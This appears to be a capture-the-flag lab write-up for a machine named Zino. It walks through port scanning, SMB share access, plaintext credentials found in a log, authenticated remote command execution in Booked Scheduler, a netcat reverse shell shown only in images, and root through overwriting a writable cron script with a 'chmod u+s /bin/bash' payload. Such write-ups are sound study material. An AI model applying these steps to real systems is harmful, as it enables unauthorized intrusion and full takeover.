# Zino

```
$ nmap -p- --min-rate 3000 -Pn 192.168.157.64 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-16 09:52 +08
Nmap scan report for 192.168.157.64
Host is up (0.17s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
8003/tcp open  mcreport
```

### FTP + SMB Enumeration

FTP doesn't allow for anonymous logins, but SMB does have shares we can read.&#x20;

```
$ smbmap -H 192.168.157.64         
[+] IP: 192.168.157.64:445      Name: 192.168.157.64                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        zino                                                    READ ONLY       Logs
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
```

We can login to `zino`:

```
$ smbclient //192.168.157.64/zino                                             
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul 10 03:11:49 2020
  ..                                  D        0  Tue Apr 28 21:38:53 2020
  .bash_history                       H        0  Tue Apr 28 23:35:28 2020
  error.log                           N      265  Tue Apr 28 22:07:32 2020
  .bash_logout                        H      220  Tue Apr 28 21:38:53 2020
  local.txt                           N       33  Sun Jul 16 09:51:53 2023
  .bashrc                             H     3526  Tue Apr 28 21:38:53 2020
  .gnupg                             DH        0  Tue Apr 28 22:17:02 2020
  .profile                            H      807  Tue Apr 28 21:38:53 2020
  misc.log                            N      424  Tue Apr 28 22:08:15 2020
  auth.log                            N      368  Tue Apr 28 22:07:54 2020
  access.log                          N     5464  Tue Apr 28 22:07:09 2020
  ftp                                 D        0  Tue Apr 28 22:12:56 2020

                7158264 blocks of size 1024. 4725468 blocks available
```

The `misc.log` contained credentials for some software:

```
$ cat misc.log  
Apr 28 08:39:01 zino systemd[1]: Starting Clean php session files...
Apr 28 08:39:01 zino CRON[2791]: (CRON) info (No MTA installed, discarding output)
Apr 28 08:39:01 zino systemd[1]: phpsessionclean.service: Succeeded.
Apr 28 08:39:01 zino systemd[1]: Started Clean php session files.
Apr 28 08:39:01 zino systemd[1]: Set application username "admin"
Apr 28 08:39:01 zino systemd[1]: Set application password "adminadmin"
```

### Booked RCE

The only web port was port 8003, and it led us to this login page:

<figure><img src="../../../.gitbook/assets/image (2046).png" alt=""><figcaption></figcaption></figure>

There are some exploits for this:

```
$ searchsploit booked            
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Booked Scheduler 2.7.5 - Remote Command Execution (Metaspl | php/webapps/46486.rb
Booked Scheduler 2.7.5 - Remote Command Execution (RCE) (A | php/webapps/50594.py
Booked Scheduler 2.7.7 - Authenticated Directory Traversal | php/webapps/48428.txt
----------------------------------------------------------- ---------------------------------
```

We can use the credentials we got earlier to have RCE:

<figure><img src="../../../.gitbook/assets/image (2045).png" alt=""><figcaption></figcaption></figure>

We can then get a reverse shell through `nc`:

<figure><img src="../../../.gitbook/assets/image (510).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Cronjob Exploit --> Root

I downloaded `linpeas.sh` onto the machine and ran a scan. It found a cronjob we could hijack:

<figure><img src="../../../.gitbook/assets/image (2034).png" alt=""><figcaption></figcaption></figure>

We can write to this file:

```
www-data@zino:/tmp$ ls -la /var/www/html/booked/cleanup.py
-rwxrwxrwx 1 www-data www-data 164 Apr 28  2020 /var/www/html/booked/cleanup.py
```

Here's the script contents:

```
www-data@zino:/home/peter$ cat /var/www/html/booked/cleanup.py 
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /var/www/html/booked/uploads/reservation/* ')
except:
        print 'ERROR...'
sys.exit(0)
```

Since there's a `sys.exit(0)` function at the end, we cannot just append code. What we can do is just create a completely new `cleanup.py` file within that directory.&#x20;

```bash
echo 'import os;os.system("chmod u+s /bin/bash")' > cleanup.py
```

Then we can just wait for a bit for the script to execute.&#x20;

<figure><img src="../../../.gitbook/assets/image (3424).png" alt=""><figcaption></figcaption></figure>
